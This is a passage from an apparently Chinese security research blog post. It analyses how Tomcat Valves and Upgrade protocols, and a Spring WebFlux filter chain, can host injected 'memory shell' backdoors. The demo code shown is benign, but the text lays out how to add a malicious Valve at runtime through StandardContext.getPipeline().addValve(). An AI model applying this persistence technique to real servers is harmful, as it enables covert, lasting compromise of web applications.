  <span class="keyword">if</span> (pattern.matches(request.getPath().pathWithinApplication()))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello, this is our GreetingFilter!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;DefaultWebFilterChain&quot;</span>).build());</span><br><span class="line">        List&lt;Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_type(<span class="string">&quot;java.io.File&quot;</span>).build());</span><br><span class="line">        <span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);</span><br><span class="line">        searcher.setBlacklists(blacklists);</span><br><span class="line">        searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line">        searcher.setMax_search_depth(<span class="number">10</span>);</span><br><span class="line">        searcher.setReport_save_path(<span class="string">&quot;D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin&quot;</span>);</span><br><span class="line">        searcher.searchObject();</span><br><span class="line">        <span class="keyword">return</span> webFilterChain.filter(serverWebExchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们设置的关键字是<code>DefaultWebFilterChain</code>，然后直接运行：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126145528943.png"></p><p>也就是说，位置是在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;reactor.netty.resources.DefaultLoopResources$EventLoop&#125; </span><br><span class="line">  ---&gt; group = &#123;java.lang.ThreadGroup&#125; </span><br><span class="line">   ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125; </span><br><span class="line">    ---&gt; [3] = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer$1&#125; </span><br><span class="line">     ---&gt; this$0 = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer&#125; </span><br><span class="line">      ---&gt; handler = &#123;org.springframework.http.server.reactive.ReactorHttpHandlerAdapter&#125; </span><br><span class="line">       ---&gt; httpHandler = &#123;org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler&#125; </span><br><span class="line">        ---&gt; delegate = &#123;org.springframework.web.server.adapter.HttpWebHandlerAdapter&#125; </span><br><span class="line">         ---&gt; delegate = &#123;org.springframework.web.server.handler.ExceptionHandlingWebHandler&#125; </span><br><span class="line">           ---&gt; delegate = &#123;org.springframework.web.server.handler.FilteringWebHandler&#125; </span><br><span class="line">            ---&gt; chain = &#123;org.springframework.web.server.handler.DefaultWebFilterChain&#125;</span><br></pre></td></tr></table></figure><h2 id="2-13-Tomcat-Valve介绍与运行过程分析"><a href="#2-13-Tomcat-Valve介绍与运行过程分析" class="headerlink" title="2.13 Tomcat Valve介绍与运行过程分析"></a>2.13 Tomcat Valve介绍与运行过程分析</h2><h3 id="2-13-1-Valve与Pipeline"><a href="#2-13-1-Valve与Pipeline" class="headerlink" title="2.13.1 Valve与Pipeline"></a>2.13.1 Valve与Pipeline</h3><p>在众多文章里面，下面的这篇我觉得是讲的最通俗易懂的，这里推荐给大家：</p><blockquote><p><a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p></blockquote><p>这里我组合引用原文，做了适当的修改，概括一下：</p><p><code>tomcat</code>中的<code>Container</code>有4种，分别是<code>Engine</code>、<code>Host</code>、<code>Context</code>和<code>Wrapper</code>，这<code>4</code>个<code>Container</code>的实现类分别是<code>StandardEngine</code>、<code>StandardHost</code>、<code>StandardContext</code>和<code>StandardWrapper</code>。<code>4</code>种容器的关系是包含关系，<code>Engine</code>包含<code>Host</code>，<code>Host</code>包含<code>Context</code>，<code>Context</code>包含<code>Wrapper</code>，<code>Wrapper</code>则代表最基础的一个<code>Servlet</code>。<br><code>tomcat</code>由<code>Connector</code>和<code>Container</code>两部分组成，而当网络请求过来的时候<code>Connector</code>先将请求包装为<code>Request</code>，然后将<code>Request</code>交由<code>Container</code>进行处理，最终返回给请求方。而<code>Container</code>处理的第一层就是<code>Engine</code>容器，但是在<code>tomcat</code>中<code>Engine</code>容器不会直接调用<code>Host</code>容器去处理请求，那么请求是怎么在<code>4</code>个容器中流转的，4个容器之间是怎么依次调用的呢？</p><p>原来，当请求到达<code>Engine</code>容器的时候，<code>Engine</code>并非是直接调用对应的<code>Host</code>去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做<code>pipeline</code>组件，跟<code>pipeline</code>相关的还有个也是容器内部的组件，叫做<code>valve</code>组件。</p><p><code>Pipeline</code>的作用就如其中文意思一样——管道，可以把不同容器想象成一个独立的个体，那么<code>pipeline</code>就可以理解为不同容器之间的管道，道路，桥梁。那<code>Valve</code>这个组件是什么东西呢？<code>Valve</code>也可以直接按照字面意思去理解为阀门。我们知道，在生活中可以看到每个管道上面都有阀门，<code>Pipeline</code>和<code>Valve</code>关系也是一样的。<code>Valve</code>代表管道上的阀门，可以控制管道的流向，当然每个管道上可以有多个阀门。如果把<code>Pipeline</code>比作公路的话，那么<code>Valve</code>可以理解为公路上的收费站，车代表<code>Pipeline</code>中的内容，那么每个收费站都会对其中的内容做一些处理（收费，查证件等）。</p><p>在<code>Catalina</code>中，<code>4</code>种容器都有自己的<code>Pipeline</code>组件，每个<code>Pipeline</code>组件上至少会设定一个<code>Valve</code>，这个<code>Valve</code>我们称之为<code>BaseValve</code>，也就是基础阀。基础阀的作用是连接当前容器的下一个容器（通常是自己的自容器），可以说基础阀是两个容器之间的桥梁。</p><p><code>Pipeline</code>定义对应的接口<code>Pipeline</code>，标准实现了<code>StandardPipeline</code>。<code>Valve</code>定义对应的接口<code>Valve</code>，抽象实现类<code>ValveBase</code>，<code>4</code>个容器对应基础阀门分别是<code>StandardEngineValve</code>，<code>StandardHostValve</code>，<code>StandardContextValve</code>，<code>StandardWrapperValve</code>。在实际运行中，<code>Pipeline</code>和<code>Valve</code>运行机制如下图：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240129171852854.png"></p><p>这张图是新加坡的<code>Dennis Jacob</code>在<code>ApacheCON Asia 2022</code>上的演讲《Extending Valves in Tomcat》中的<code>PPT</code>中的图片，<code>pdf</code>链接如下：</p><blockquote><p><a href="https://people.apache.org/~huxing/acasia2022/Dennis-Jacob-Extending-Valves-in-Tomcat.pdf">https://people.apache.org/~huxing/acasia2022/Dennis-Jacob-Extending-Valves-in-Tomcat.pdf</a></p></blockquote><p>这篇演讲的录屏在<code>Youtube</code>上面可以找到：</p><blockquote><p><a href="https://www.youtube.com/watch?v=Jmw-d0kyZ_4">https://www.youtube.com/watch?v=Jmw-d0kyZ_4</a></p></blockquote><h3 id="2-13-2-编写一个简单Tomcat-Valve的demo"><a href="#2-13-2-编写一个简单Tomcat-Valve的demo" class="headerlink" title="2.13.2 编写一个简单Tomcat Valve的demo"></a>2.13.2 编写一个简单Tomcat Valve的demo</h3><p>由于在<code>Tomcat</code>环境下使用Valve还要配置web.xml，我嫌麻烦，于是直接使用<code>SpringBoot</code>来搭建。记得这里勾选的是<code>Spring Web</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240129184504826.png"></p><p>然后创建<code>test</code>目录并在<code>test</code>目录下创建两个文件，<code>TestValve.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.valvememoryshelldemo.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Valve 被成功调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有<code>TestConfig.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.valvememoryshelldemo.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Valve;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.server.WebServerFactoryCustomizer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> WebServerFactoryCustomizer&lt;TomcatServletWebServerFactory&gt; <span class="title function_">tomcatCustomizer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> factory -&gt; &#123;</span><br><span class="line">            factory.addContextValves(getTestValve());</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getTestValve</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TestValve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果如下：<img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240129184753374.png"></p><h3 id="2-13-3-Tomcat-Valve打入内存马思路分析"><a href="#2-13-3-Tomcat-Valve打入内存马思路分析" class="headerlink" title="2.13.3 Tomcat Valve打入内存马思路分析"></a>2.13.3 Tomcat Valve打入内存马思路分析</h3><p>我们通常情况下用的都是<code>ValveBase</code>，点进这个<code>ValveBase</code>，可以看到是实现了<code>Valve</code>接口：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130140509002.png"></p><p>点进<code>valve</code>可以看到该接口代码如下，这里我加上了注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line">    <span class="comment">// 获取下一个阀门</span></span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getNext</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">// 设置下一个阀门</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span>;</span><br><span class="line">    <span class="comment">// 后台执行逻辑，主要在类加载上下文中使用到</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">// 执行业务逻辑</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line">    <span class="comment">// 是否异步执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是调试看看这个<code>valve</code>的运行流程了，我们在<code>invoke</code>函数这里下断点调试：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130153634378.png"></p><p>我们看向左下角，看看之前调用到的<code>invoke</code>方法：</p><p>在<code>StandardHostValve.java</code>中，代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130153939854.png"></p><p>在<code>StandardEngineValve.java</code>中，代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host.getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130154036757.png"></p><p>之后的诸如<code>Http11Processor.java</code>和多线程的部分就不需要我们关注了。既然我们的目的是打入内存马，那根据我们掌握的<code>Tomcat Servlet/Filter/Listener</code>内存马的思路来看，我们需要通过某种方式添加我们自己的恶意<code>valve</code>。</p><p>我们去掉之前打的断点，在<code>StandardHostValve.java</code>这里打上断电并重新调试：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130154855309.png"></p><p>然后<code>step into</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130154950328.png"></p><p>鼠标左键单击这里的<code>getPipeline</code>即可进入到所调用的函数实现的位置：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155044025.png"></p><p>再<code>Ctrl+H</code>进入<code>Pipeline</code>接口，可以看到是有个<code>addValve</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155119909.png"></p><p>这不正是我们需要的吗？我们去看看它是在哪儿实现的，直接在<code>addValve</code>函数处<code>Ctrl+H</code>找继承该接口的类，可可以看到是在<code>org.apache.catalina.core.StandardPipeline</code>中：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155445230.png"></p><p>但是问题就来了，我们无法直接获取到这个<code>StandardPipeline</code>，而我们能直接获取到的是<code>StandardContext</code>，那就去看看<code>StandardContext.java</code>中有没有获取<code>StandardPipeline</code>的方法。</p><p>一眼就能看到我们的老熟人——<code>getPipeline</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155825670.png"></p><p>那这样以来我们的思路就可以补充完整了，先反射获取<code>StandardContext</code>，然后编写一个恶意<code>Valve</code>，最后通过<code>StandardContext.getPipeline().addValve()</code>添加就可以了。当然，我们也可以反射获取<code>StandardPipeline</code>，然后再<code>addValve</code>，这样也是可以的。</p><h2 id="2-14-Tomcat-Upgrade介绍与打入内存马思路分析"><a href="#2-14-Tomcat-Upgrade介绍与打入内存马思路分析" class="headerlink" title="2.14 Tomcat Upgrade介绍与打入内存马思路分析"></a>2.14 Tomcat Upgrade介绍与打入内存马思路分析</h2><h3 id="2-14-1-编写一个简单的Tomcat-Upgrade的demo"><a href="#2-14-1-编写一个简单的Tomcat-Upgrade的demo" class="headerlink" title="2.14.1 编写一个简单的Tomcat Upgrade的demo"></a>2.14.1 编写一个简单的Tomcat Upgrade的demo</h3><h4 id="2-14-1-1-利用SpringBoot搭建"><a href="#2-14-1-1-利用SpringBoot搭建" class="headerlink" title="2.14.1.1 利用SpringBoot搭建"></a>2.14.1.1 利用SpringBoot搭建</h4><p>我这里在之前的<code>Tomcat Valve</code>项目的基础上做了简单的修改，删除之前<code>test</code>目录下的<code>TestValve.java</code>，新建一个<code>TestUpgrade.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.valvememoryshelldemo.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.SocketWrapperBase;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestUpgrade</span> <span class="keyword">implements</span> <span class="title class_">UpgradeProtocol</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHttpUpgradeName</span><span class="params">(<span class="type">boolean</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getAlpnIdentifier() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAlpnName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Processor <span class="title function_">getProcessor</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> InternalHttpUpgradeHandler <span class="title function_">getInternalUpgradeHandler</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter, Request request)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">accept</span><span class="params">(org.apache.coyote.Request request)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">response</span> <span class="operator">=</span> org.apache.coyote.Request.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">            response.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Response</span> <span class="variable">resp</span> <span class="operator">=</span> (Response) response.get(request);</span><br><span class="line">            resp.doWrite(ByteBuffer.wrap(<span class="string">&quot;\n\nHello, this my test Upgrade!\n\n&quot;</span>.getBytes()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后修改<code>TestConfig.java</code>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.valvememoryshelldemo.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.server.WebServerFactoryCustomizer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestConfig</span> <span class="keyword">implements</span> <span class="title class_">WebServerFactoryCustomizer</span>&lt;TomcatServletWebServerFactory&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">customize</span><span class="params">(TomcatServletWebServerFactory factory)</span> &#123;</span><br><span class="line">        factory.addConnectorCustomizers(connector -&gt; &#123;</span><br><span class="line">            connector.addUpgradeProtocol(<span class="keyword">new</span> <span class="title class_">TestUpgrade</span>());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后命令行执行命令<code>curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; http://localhost:8080</code>，效果如下：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131011203184.png"></p><h4 id="2-14-1-2-利用Tomcat搭建"><a href="#2-14-1-2-利用Tomcat搭建" class="headerlink" title="2.14.1.2 利用Tomcat搭建"></a>2.14.1.2 利用Tomcat搭建</h4><p>当然也是可以利用<code>Tomcat</code>来搭建的，只需要<code>TestUpgrade.java</code>即可，因为里面含有定义的<code>servlet</code>逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Adapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Processor;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.UpgradeProtocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.SocketWrapperBase;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/evil&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestUpgrade</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyUpgrade</span> <span class="keyword">implements</span> <span class="title class_">UpgradeProtocol</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getHttpUpgradeName</span><span class="params">(<span class="type">boolean</span> b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] getAlpnIdentifier() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getAlpnName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Processor <span class="title function_">getProcessor</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> InternalHttpUpgradeHandler <span class="title function_">getInternalUpgradeHandler</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter, org.apache.coyote.Request request)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span 